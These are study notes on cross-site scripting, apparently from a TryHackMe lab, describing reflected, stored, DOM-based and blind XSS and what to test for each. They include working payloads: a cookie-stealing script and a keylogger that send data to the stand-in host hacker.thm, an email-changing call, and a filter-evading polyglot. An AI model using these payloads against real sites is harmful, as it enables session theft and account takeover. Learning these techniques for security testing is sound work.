# **Cross-site Scripting**

---

## **Introduction**

Injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users

---

## **Payload**

Payload is the JavaScript code we wish to be executed on the targets computer

- intention:  what you wish the JavaScript to actually do
- modification: changes to the code we need to make it execute as every scenario is different

| Name | Exemple | Description |
| ---- | ------- | ----------- |
|Proof Of Concept|`<script>alert('XSS');</script>`|Demonstrate that you can achieve XSS on a website.|
|Session Stealing|`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`|Details of a user's session, such as login tokens, are often kept in cookies on the targets machine|
|Key Logger|`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`|anything you type on the webpage will be forwarded to a website under the hacker's control|
|Business Logic|`<script>user.changeEmail('attacker@hacker.thm');</script>`|This would be about calling a particular network resource or a JavaScript function|

---

## **Reflected XSS**

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

Potential Impact : The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser

What to test:

1. Parameters in the URL
2. URL file path
3. HTTP headers

---

## **Stored XSS**

XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

What to test:

1. Comments on a blog
2. User profile information
3. Website Listings

---

## **DOM Based XSS**

DOM stands for Document Object Model and is a programming interface for HTML and XML documents.

A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.

What to test:

Look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

---

## **Blind XSS**

Blind XSS is similar to a stored XSS but in this instance, you can't see the payload working or be able to test it against yourself first.

What to test:

you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

---

## **Polyglots**

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.

You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
